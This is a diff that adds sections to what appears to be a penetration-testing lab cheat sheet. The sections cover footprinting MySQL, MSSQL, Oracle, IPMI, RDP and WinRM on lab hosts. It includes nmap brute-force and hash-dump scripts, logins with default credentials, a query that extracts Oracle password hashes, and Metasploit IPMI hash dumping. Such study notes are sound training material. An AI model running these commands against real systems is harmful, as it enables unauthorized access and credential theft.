@@ -106,3 +106,90 @@ $ braa <community string>@<IP>:.1.3.6.*
 $ braa public@10.129.14.128:.1.3.6.*
 ```
 %% Once we know a community string, we can use it with braa to brute-force the individual OIDs and enumerate the information behind them. %%
+
+### MySQL
+```
+$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
+```
+%% scanning MySQL server %%
+
+```
+$ mysql -u root -pP4SSw0rd -h 10.129.14.128
+```
+%% connect to mysql %%
+
+### MSSQL
+```
+$ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.230.249
+```
+%% mssql script scan %%
+
+```
+$ msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
+```
+%% mssql ping in metasploit %%
+
+```
+$ msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
+```
+%% python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth %%
+
+### ORACLE
+```
+$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+```
+%% nmap SID Bruteforcing %%
+
+```
+$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
+```
+%% oracle RDBMS database enumeration and login as database administrator%%
+
+```
+SQL> select name, password from sys.user$;
+```
+%% extract password hashes %%
+
+```
+$ ./odat.py all -s 10.129.204.235
+```
+%% oracle database enumeration for vulnerabilities %%
+
+### IPMI
+```
+$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+```
+%% footprinting IPMI %%
+
+```
+msf6 > use auxiliary/scanner/ipmi/ipmi_version 
+```
+%% metasploit version IPMI version scan %%
+
+```
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
+```
+%% once you do a version scan there is an IPMI flaw that exist in IPMI version 2 where you can retrieve IPMI hashes which you can try to crack offline or do a pass the hash attack if allowed %%
+
+### RDP
+```
+$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
+```
+%% footprint rdp %%
+
+```
+$ nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
+```
+%% check packets sent  over rdp %%
+
+```
+$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
+$ ./rdp-sec-check.pl 10.129.201.248
+```
+%% rdp security check %%
+
+### WINRM
+```
+$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
+```
+%% footprint winrm %%
